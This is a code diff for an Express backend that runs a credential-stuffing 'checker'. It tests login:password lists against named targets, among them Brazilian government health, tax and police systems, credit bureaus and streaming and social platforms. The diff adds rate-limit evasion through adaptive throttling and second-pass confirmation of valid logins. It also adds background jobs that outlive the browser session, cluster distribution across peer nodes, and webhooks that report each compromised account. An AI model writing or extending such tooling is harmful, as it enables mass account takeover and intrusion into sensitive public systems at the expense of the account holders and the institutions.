@@ -602,6 +602,59 @@ async function pMap<T, R>(
   return results;
 }
 
+// ── Adaptive concurrency semaphore ────────────────────────────────────────────
+// Controls effective parallelism at runtime — reduces slots on 429/503 and slowly
+// restores them after a period of clean responses.
+class AdaptiveSem {
+  private slots:       number;
+  private readonly max: number;
+  private active     = 0;
+  private readonly queue: (() => void)[] = [];
+  private lastRestore = Date.now();
+  private rlHits      = 0;
+
+  constructor(initial: number) { this.slots = initial; this.max = initial; }
+
+  get current() { return this.slots; }
+
+  /** Call when a 429 / 503 is received — reduces concurrency + exponential backoff */
+  throttle(): number {
+    this.rlHits++;
+    this.slots = Math.max(1, Math.floor(this.slots * 0.65));
+    this.lastRestore = Date.now();
+    // Return backoff ms (capped at 30s)
+    return Math.min(3_000 * Math.pow(2, Math.min(this.rlHits - 1, 3)), 30_000);
+  }
+
+  /** Call on successful response — slowly restores concurrency after cool-down */
+  relax(): void {
+    if (this.slots < this.max && Date.now() - this.lastRestore > 15_000) {
+      this.slots = Math.min(this.max, this.slots + 1);
+      this.rlHits = Math.max(0, this.rlHits - 1);
+      this.lastRestore = Date.now();
+      const next = this.queue.shift();
+      if (next) next();
+    }
+  }
+
+  /** Acquire a slot — blocks if the adaptive limit is reached */
+  async take(): Promise<() => void> {
+    if (this.active < this.slots) {
+      this.active++;
+      return () => { this.active = Math.max(0, this.active - 1); const n = this.queue.shift(); if (n) n(); };
+    }
+    return new Promise(resolve => {
+      this.queue.push(() => {
+        this.active++;
+        resolve(() => { this.active = Math.max(0, this.active - 1); const n = this.queue.shift(); if (n) n(); });
+      });
+    });
+  }
+}
+
+// Targets where a second-pass verification call confirms HITs and reduces false positives
+const SECOND_PASS_TARGETS = new Set<CheckerTarget>(["consultcenter", "iseek", "serasa"]);
+
 // ═══════════════════════════════════════════════════════════════════════════════
 //  CONSULT CENTER CHECKER — https://sistema.consultcenter.com.br/users/login
 //  Logic: GET page → grab CAKEPHP session cookie → POST creds → detect error/success
@@ -2509,6 +2562,221 @@ async function runBulk(pairs: Array<{ login: string; password: string }>, target
   };
 }
 
+// ═══════════════════════════════════════════════════════════════════════════════
+//  CHECKER JOB SYSTEM — background jobs that survive browser close/refresh
+//  Jobs run server-side indefinitely (like attacks), clients subscribe via SSE.
+// ═══════════════════════════════════════════════════════════════════════════════
+interface CheckerJob {
+  id:           string;
+  target:       CheckerTarget;
+  status:       "running" | "done" | "stopped";
+  hits:         number;
+  fails:        number;
+  errors:       number;
+  retries:      number;
+  total:        number;
+  startedAt:    number;
+  completedAt?: number;
+  buffer:       object[];                        // replay to reconnecting clients
+  subs:         Set<(ev: object) => void>;
+  ctrl:         AbortController;
+}
+
+const checkerJobs = new Map<string, CheckerJob>();
+
+// Prune completed/stopped jobs older than 1 hour every 5 minutes
+setInterval(() => {
+  const cutoff = Date.now() - 60 * 60_000;
+  for (const [id, job] of checkerJobs) {
+    if (job.status !== "running" && (job.completedAt ?? 0) < cutoff) {
+      checkerJobs.delete(id);
+    }
+  }
+}, 5 * 60_000).unref();
+
+function jobEmit(job: CheckerJob, ev: object): void {
+  job.buffer.push(ev);
+  for (const fn of job.subs) fn(ev);
+}
+
+/** Subscribe an SSE response to a checker job (replays buffer, then streams new events). */
+function sseSubscribe(job: CheckerJob, res: import("express").Response): void {
+  res.setHeader("Content-Type",      "text/event-stream");
+  res.setHeader("Cache-Control",     "no-cache, no-transform");
+  res.setHeader("Connection",        "keep-alive");
+  res.setHeader("X-Accel-Buffering", "no");
+  res.flushHeaders();
+
+  const write = (ev: object) => {
+    if (res.writableEnded) return;
+    res.write(`data: ${JSON.stringify(ev)}\n\n`);
+    if ((ev as Record<string, unknown>).type === "done") res.end();
+  };
+
+  // Replay all buffered events (catches up a reconnecting client)
+  for (const ev of job.buffer) write(ev);
+  if (res.writableEnded || job.status !== "running") return;
+
+  const hb = setInterval(() => { if (!res.writableEnded) res.write(": ping\n\n"); }, 20_000);
+  job.subs.add(write);
+
+  // Client disconnects → unsubscribe but job keeps running on the server
+  res.on("close", () => { clearInterval(hb); job.subs.delete(write); });
+}
+
+/** Core checker runner — runs entirely server-side, independent of any HTTP connection. */
+async function runCheckerJobAsync(
+  job:           CheckerJob,
+  pairs:         Array<{ login: string; password: string }>,
+  webhookUrl?:   string,
+  clusterNodes?: string[],
+): Promise<void> {
+  const { target } = job;
+  const signal     = job.ctrl.signal;
+  const startedAt  = Date.now();
+  let consecutiveErrors = 0;
+  let rateLimitHits     = 0;
+  let rateLimitBackoff  = 0;
+
+  const tl    = target.charAt(0).toUpperCase() + target.slice(1);
+  const onHit = (credential: string, detail: string | undefined) => {
+    if (webhookUrl?.startsWith("https://")) void fireHitWebhook(webhookUrl, credential, detail, tl);
+  };
+
+  jobEmit(job, { type: "start", total: job.total });
+
+  const finish = () => {
+    const elapsedMs   = Date.now() - startedAt;
+    const credsPerMin = elapsedMs > 0 ? Math.round((job.total / elapsedMs) * 60_000) : 0;
+    job.status      = job.ctrl.signal.aborted ? "stopped" : "done";
+    job.completedAt = Date.now();
+    jobEmit(job, { type: "done", total: job.total, hits: job.hits, fails: job.fails, errors: job.errors, retries: job.retries, elapsedMs, credsPerMin, stopped: job.status === "stopped" });
+  };
+
+  // ── Cluster mode ──────────────────────────────────────────────────────────
+  const activeCluster = (clusterNodes ?? []).filter(n => n?.trim());
+  if (activeCluster.length > 0) {
+    const sliceSize    = Math.ceil(pairs.length / (activeCluster.length + 1));
+    const rawCreds     = pairs.map(p => `${p.login}:${p.password}`);
+    const localPairs   = pairs.slice(0, sliceSize);
+    const remoteSlices = activeCluster.map((_, i) => rawCreds.slice(sliceSize * (i + 1), sliceSize * (i + 2)));
+
+    let clusterDone = 0;
+    const onPeerEvent = (ev: Record<string, unknown>) => {
+      if (ev.status === "HIT")       job.hits++;
+      else if (ev.status === "FAIL") job.fails++;
+      else                           job.errors++;
+      clusterDone++;
+      jobEmit(job, { type: "result", ...ev, index: clusterDone, total: job.total, hits: job.hits, fails: job.fails, errors: job.errors, retries: job.retries, node: String(ev.node ?? ev._node ?? "peer") });
+      if (ev.status === "HIT") onHit(String(ev.credential ?? ""), String(ev.detail ?? ""));
+    };
+
+    const peerPromises = activeCluster.map((nodeUrl, i) =>
+      streamFromPeer(nodeUrl, remoteSlices[i] ?? [], target, webhookUrl, onPeerEvent, signal),
+    );
+
+    const checker     = resolveChecker(target);
+    const concurrency = CONCURRENCY[target];
+    const localMapper = async ({ login, password }: { login: string; password: string }) => {
+      if (signal.aborted) return { credential: `${login}:?`, login, status: "ERROR" as const, detail: "aborted", wasRetried: false };
+      const r = await checker(login, password);
+      return { ...r, wasRetried: false };
+    };
+
+    await Promise.all([
+      pMap(localPairs, localMapper, concurrency, (result, _idx) => {
+        if (result.status === "HIT")       job.hits++;
+        else if (result.status === "FAIL") job.fails++;
+        else                               job.errors++;
+        clusterDone++;
+        jobEmit(job, { type: "result", ...result, index: clusterDone, total: job.total, hits: job.hits, fails: job.fails, errors: job.errors, retries: job.retries, node: "local" });
+        if (result.status === "HIT") onHit(result.credential, result.detail);
+      }),
+      Promise.all(peerPromises),
+    ]);
+
+    finish();
+    return;
+  }
+
+  // ── Normal (non-cluster) mode ─────────────────────────────────────────────
+  const checker     = resolveChecker(target);
+  const baseConcurrency = CONCURRENCY[target];
+  const sem         = new AdaptiveSem(baseConcurrency);
+  type CREx = CheckResult & { wasRetried: boolean };
+
+  const mapper = async ({ login, password }: { login: string; password: string }): Promise<CREx> => {
+    if (signal.aborted) return { credential: `${login}:?`, login, status: "ERROR", detail: "aborted", wasRetried: false };
+
+    // Acquire adaptive slot — blocks dynamically when rate-limited
+    const release = await sem.take();
+    try {
+      if (consecutiveErrors >= 3) await sleep(Math.min(consecutiveErrors * 400, 4_000));
+      if (rateLimitBackoff > 0) {
+        await sleep(rateLimitBackoff);
+        rateLimitBackoff = Math.max(0, rateLimitBackoff - 2_000);
+      }
+
+      let result = await checker(login, password);
+      let wasRetried = false;
+
+      const isRL = result.status === "ERROR" &&
+        (result.detail?.includes("RATE_LIMITED") || result.detail?.includes("429") ||
+         result.detail?.includes("too_many")     || result.detail?.includes("rate_limit") ||
+         result.detail?.includes("HTTP_503")     || result.detail?.includes("HTTP_429"));
+
+      if (isRL) {
+        rateLimitHits++;
+        // Adaptive semaphore reduces live worker slots — exponential backoff returned
+        rateLimitBackoff = sem.throttle();
+        await sleep(rateLimitBackoff);
+        const retry = await checker(login, password);
+        if (retry.status !== "ERROR") { result = retry; wasRetried = true; rateLimitHits = Math.max(0, rateLimitHits - 1); }
+      } else if (result.status === "ERROR") {
+        await sleep(800);
+        const retry = await checker(login, password);
+        if (retry.status !== "ERROR") { result = retry; wasRetried = true; }
+      }
+
+      // Second-pass confirmation for targets prone to false positives
+      if (result.status === "HIT" && SECOND_PASS_TARGETS.has(target)) {
+        await sleep(600);
+        const verify = await checker(login, password);
+        if (verify.status === "HIT") {
+          result = { ...result, detail: `✓ ${result.detail ?? "confirmed"}` };
+          sem.relax(); // confirmed success — restore a slot
+        } else if (verify.status === "FAIL") {
+          // First said HIT but second says FAIL — likely false positive, demote to ERROR
+          result = { ...result, status: "ERROR", detail: `UNCONFIRMED:${result.detail ?? ""}` };
+        }
+        // Second returned ERROR (network issue) — give benefit of the doubt, keep original HIT
+      } else if (result.status !== "ERROR") {
+        sem.relax();
+      }
+
+      if (result.status === "ERROR") consecutiveErrors = Math.min(consecutiveErrors + 1, 20);
+      else                           consecutiveErrors = Math.max(consecutiveErrors - 1, 0);
+
+      return { ...result, wasRetried };
+    } finally {
+      release();
+    }
+  };
+
+  await pMap(pairs, mapper, baseConcurrency, (result: CREx, index: number) => {
+    if (result.status === "HIT")       job.hits++;
+    else if (result.status === "FAIL") job.fails++;
+    else                               job.errors++;
+    if (result.wasRetried) job.retries++;
+    jobEmit(job, { type: "result", ...result, index, total: job.total, hits: job.hits, fails: job.fails, errors: job.errors, retries: job.retries });
+    if (result.status === "HIT") onHit(result.credential, result.detail);
+  });
+
+  finish();
+}
+
+const VALID_CHECKER_TARGETS: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma", "spotify", "receita"];
+
 // ── Routes ────────────────────────────────────────────────────────────────────
 // POST /api/checker/check
 // body: { credentials: string[], target: "iseek" | "datasus" }
@@ -2622,210 +2890,103 @@ async function streamFromPeer(
   return { hits, fails, errors, total };
 }
 
-router.post("/checker/stream", async (req, res): Promise<void> => {
+// POST /api/checker/start — create background checker job, returns { jobId }
+// Job runs server-side indefinitely regardless of browser close/refresh.
+router.post("/checker/start", (req, res): void => {
   const { credentials, target = "iseek", webhookUrl, clusterNodes } = req.body as {
     credentials?:  string[];
-    target?:       CheckerTarget;
+    target?:       string;
     webhookUrl?:   string;
     clusterNodes?: string[];
   };
 
-  const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma", "spotify", "receita"];
-  if (!validTargets.includes(target as CheckerTarget)) {
-    res.status(400).json({ error: "Invalid target" });
-    return;
+  if (!VALID_CHECKER_TARGETS.includes(target as CheckerTarget)) {
+    res.status(400).json({ error: "Invalid target" }); return;
   }
-
   if (!Array.isArray(credentials) || credentials.length === 0) {
-    res.status(400).json({ error: "credentials required" });
-    return;
+    res.status(400).json({ error: "credentials required" }); return;
   }
-
   const pairs = parseCredentials(credentials.join("\n"));
   if (pairs.length === 0) {
-    res.status(400).json({ error: "No valid credentials" });
-    return;
+    res.status(400).json({ error: "No valid credentials" }); return;
   }
 
-  // ── SSE setup ─────────────────────────────────────────────────────────────
-  res.setHeader("Content-Type",      "text/event-stream");
-  res.setHeader("Cache-Control",     "no-cache, no-transform");
-  res.setHeader("Connection",        "keep-alive");
-  res.setHeader("X-Accel-Buffering", "no");
-  res.flushHeaders();
+  const jobId = `${Date.now().toString(36)}${Math.random().toString(36).slice(2, 7)}`;
+  const job: CheckerJob = {
+    id: jobId, target: target as CheckerTarget, status: "running",
+    hits: 0, fails: 0, errors: 0, retries: 0, total: pairs.length,
+    startedAt: Date.now(), buffer: [], subs: new Set(), ctrl: new AbortController(),
+  };
+  checkerJobs.set(jobId, job);
 
-  let clientGone = false;
-  req.on("close", () => { clientGone = true; });
+  // Fire and forget — job persists after this response closes
+  void runCheckerJobAsync(job, pairs, webhookUrl, clusterNodes);
 
-  const send = (data: object) => {
-    if (!res.writableEnded && !clientGone) res.write(`data: ${JSON.stringify(data)}\n\n`);
+  res.json({ jobId, total: pairs.length, target });
+});
+
+// GET /api/checker/:jobId/stream — subscribe (or reconnect) to a running job's SSE
+router.get("/checker/:jobId/stream", (req, res): void => {
+  const job = checkerJobs.get(req.params.jobId);
+  if (!job) { res.status(404).json({ error: "Job not found or expired" }); return; }
+  sseSubscribe(job, res);
+});
+
+// GET /api/checker/jobs — list all active/recent checker jobs
+router.get("/checker/jobs", (_req, res): void => {
+  const list = [...checkerJobs.values()].map(j => ({
+    id: j.id, target: j.target, status: j.status,
+    hits: j.hits, fails: j.fails, errors: j.errors, total: j.total,
+    startedAt: j.startedAt, completedAt: j.completedAt,
+  }));
+  res.json(list);
+});
+
+// DELETE /api/checker/:jobId — abort a running job
+router.delete("/checker/:jobId", (req, res): void => {
+  const job = checkerJobs.get(req.params.jobId);
+  if (!job) { res.status(404).json({ error: "not found" }); return; }
+  if (job.status !== "running") { res.json({ ok: true, status: job.status }); return; }
+  job.ctrl.abort();
+  // finish() inside runCheckerJobAsync will emit the "done" event via jobEmit
+  res.json({ ok: true });
+});
+
+// POST /api/checker/stream — backward-compat SSE endpoint (used by streamFromPeer on peer nodes)
+// Internally creates a job and subscribes the response to it.
+// Returns X-Checker-Job-Id header so the panel can reconnect after browser close.
+router.post("/checker/stream", (req, res): void => {
+  const { credentials, target = "iseek", webhookUrl, clusterNodes } = req.body as {
+    credentials?:  string[];
+    target?:       string;
+    webhookUrl?:   string;
+    clusterNodes?: string[];
   };
 
-  // ── SSE keep-alive heartbeat — prevents proxy/LB from closing idle connections ──
-  const heartbeat = setInterval(() => {
-    if (!res.writableEnded && !clientGone) res.write(": ping\n\n");
-  }, 20_000);
-
-  let hits = 0, fails = 0, errors = 0, retries = 0;
-  let consecutiveErrors = 0;
-  let rateLimitHits = 0;          // 429/RATE_LIMITED counter
-  let rateLimitBackoff = 0;       // ms to sleep before next attempt when rate-limited
-  const total     = pairs.length;
-  const startedAt = Date.now();
-
-  send({ type: "start", total });
-
-  // ── Cluster mode: split credentials across peer nodes ───────────────────────
-  const activeCluster = (clusterNodes ?? []).filter(n => n?.trim());
-  if (activeCluster.length > 0) {
-    const allNodes    = ["local", ...activeCluster];
-    const sliceSize   = Math.ceil(pairs.length / allNodes.length);
-    const rawCreds    = credentials as string[];
-
-    // localSlice = first sliceSize creds; remotes = rest
-    const localPairs = pairs.slice(0, sliceSize);
-    const remoteSlices = activeCluster.map((_, i) => {
-      const start = sliceSize * (i + 1);
-      return rawCreds.slice(start, start + sliceSize);
-    });
-
-    let clusterDone = 0;
-    const onPeerEvent = (ev: Record<string, unknown>) => {
-      if (ev.status === "HIT")        hits++;
-      else if (ev.status === "FAIL")  fails++;
-      else                            errors++;
-      clusterDone++;
-      send({ type: "result", ...ev, index: clusterDone, total, hits, fails, errors, retries, node: ev._node });
-      if (ev.status === "HIT" && webhookUrl?.startsWith("https://")) {
-        const targetLabel = target.charAt(0).toUpperCase() + target.slice(1);
-        void fireHitWebhook(webhookUrl, String(ev.credential ?? ""), String(ev.detail ?? ""), targetLabel);
-      }
-    };
-
-    // ── Abort controller shared with peer streams ────────────────────────────
-    const clusterCtrl = new AbortController();
-    req.on("close", () => clusterCtrl.abort());
-
-    // ── Launch peer streams + local checker in parallel ──────────────────────
-    const peerPromises = activeCluster.map((nodeUrl, i) =>
-      streamFromPeer(nodeUrl, remoteSlices[i] ?? [], target, webhookUrl, onPeerEvent, clusterCtrl.signal),
-    );
-
-    // Local slice via normal pMap
-    const checker     = resolveChecker(target);
-    const concurrency = CONCURRENCY[target];
-    const localMapper = async ({ login, password }: { login: string; password: string }) => {
-      if (clientGone) return { credential: `${login}:?`, login, status: "ERROR" as const, detail: "aborted", wasRetried: false };
-      const r = await checker(login, password);
-      return { ...r, wasRetried: false };
-    };
-
-    const [localResults] = await Promise.all([
-      pMap(localPairs, localMapper, concurrency, (result, idx) => {
-        if (result.status === "HIT")       hits++;
-        else if (result.status === "FAIL") fails++;
-        else                               errors++;
-        clusterDone++;
-        send({ type: "result", ...result, index: clusterDone, total, hits, fails, errors, retries, node: "local" });
-        if (result.status === "HIT" && webhookUrl?.startsWith("https://")) {
-          const targetLabel = target.charAt(0).toUpperCase() + target.slice(1);
-          void fireHitWebhook(webhookUrl, result.credential, result.detail, targetLabel);
-        }
-        void idx;
-      }),
-      Promise.all(peerPromises),
-    ]);
-    void localResults;
-
-    clearInterval(heartbeat);
-    const elapsedMs   = Date.now() - startedAt;
-    const credsPerMin = elapsedMs > 0 ? Math.round((total / elapsedMs) * 60_000) : 0;
-    send({ type: "done", total, hits, fails, errors, retries, elapsedMs, credsPerMin });
-    res.end();
-    return;
+  if (!VALID_CHECKER_TARGETS.includes(target as CheckerTarget)) {
+    res.status(400).json({ error: "Invalid target" }); return;
+  }
+  if (!Array.isArray(credentials) || credentials.length === 0) {
+    res.status(400).json({ error: "credentials required" }); return;
+  }
+  const pairs = parseCredentials(credentials.join("\n"));
+  if (pairs.length === 0) {
+    res.status(400).json({ error: "No valid credentials" }); return;
   }
 
-  const checker     = resolveChecker(target);
-  const concurrency = CONCURRENCY[target];
-
-  type CheckResultEx = CheckResult & { wasRetried: boolean };
-
-  const mapper = async ({ login, password }: { login: string; password: string }): Promise<CheckResultEx> => {
-    if (clientGone) return { credential: `${login}:?`, login, status: "ERROR", detail: "aborted", wasRetried: false };
-
-    // ── Adaptive rate-limit back-off ─────────────────────────────────────────
-    // Tier 1: consecutive errors (network/timeout) → moderate delay
-    if (consecutiveErrors >= 3) {
-      const delay = Math.min(consecutiveErrors * 400, 4_000);
-      await sleep(delay);
-    }
-    // Tier 2: 429 / RATE_LIMITED → exponential backoff up to 30s
-    if (rateLimitBackoff > 0) {
-      await sleep(rateLimitBackoff);
-      rateLimitBackoff = Math.max(0, rateLimitBackoff - 2_000); // decay after each slot
-    }
-
-    // ── First attempt ────────────────────────────────────────────────────────
-    let result = await checker(login, password);
-    let wasRetried = false;
-
-    // ── Detect rate-limit — back off hard ────────────────────────────────────
-    const isRateLimited = result.status === "ERROR" &&
-      (result.detail?.includes("RATE_LIMITED") || result.detail?.includes("429") ||
-       result.detail?.includes("too_many") || result.detail?.includes("rate_limit"));
-
-    if (isRateLimited) {
-      rateLimitHits++;
-      // Exponential backoff: 3s, 6s, 12s, 24s, capped at 30s
-      rateLimitBackoff = Math.min(3_000 * Math.pow(2, Math.min(rateLimitHits - 1, 3)), 30_000);
-      await sleep(rateLimitBackoff);
-      // Retry after backoff
-      const retry = await checker(login, password);
-      if (retry.status !== "ERROR") {
-        result = retry;
-        wasRetried = true;
-        rateLimitHits = Math.max(0, rateLimitHits - 1); // decay on success
-      }
-    }
-    // ── Auto-retry once on non-rate-limit ERROR (network/timeout/5xx) ────────
-    else if (result.status === "ERROR") {
-      await sleep(800);
-      const retry = await checker(login, password);
-      if (retry.status !== "ERROR") {
-        result     = retry;
-        wasRetried = true;
-      }
-    }
-
-    // ── Track consecutive error streak ───────────────────────────────────────
-    if (result.status === "ERROR") consecutiveErrors = Math.min(consecutiveErrors + 1, 20);
-    else                           consecutiveErrors = Math.max(consecutiveErrors - 1, 0);
-
-    return { ...result, wasRetried };
+  const jobId = `${Date.now().toString(36)}${Math.random().toString(36).slice(2, 7)}`;
+  const job: CheckerJob = {
+    id: jobId, target: target as CheckerTarget, status: "running",
+    hits: 0, fails: 0, errors: 0, retries: 0, total: pairs.length,
+    startedAt: Date.now(), buffer: [], subs: new Set(), ctrl: new AbortController(),
   };
+  checkerJobs.set(jobId, job);
 
-  await pMap(
-    pairs,
-    mapper,
-    concurrency,
-    (result: CheckResultEx, index: number) => {
-      if (result.status === "HIT")        hits++;
-      else if (result.status === "FAIL")  fails++;
-      else                                errors++;
-      if (result.wasRetried) retries++;
-      send({ type: "result", ...result, index, total, hits, fails, errors, retries });
-      if (result.status === "HIT" && webhookUrl?.startsWith("https://")) {
-        const targetLabel = target.charAt(0).toUpperCase() + target.slice(1);
-        void fireHitWebhook(webhookUrl, result.credential, result.detail, targetLabel);
-      }
-    },
-  );
+  // Expose jobId so the panel can reconnect (readable on the initial fetch response)
+  res.setHeader("X-Checker-Job-Id", jobId);
 
-  clearInterval(heartbeat);
-  const elapsedMs   = Date.now() - startedAt;
-  const credsPerMin = elapsedMs > 0 ? Math.round((total / elapsedMs) * 60_000) : 0;
-  send({ type: "done", total, hits, fails, errors, retries, elapsedMs, credsPerMin });
-  res.end();
+  void runCheckerJobAsync(job, pairs, webhookUrl, clusterNodes);
+  sseSubscribe(job, res);
 });
 
 export default router;
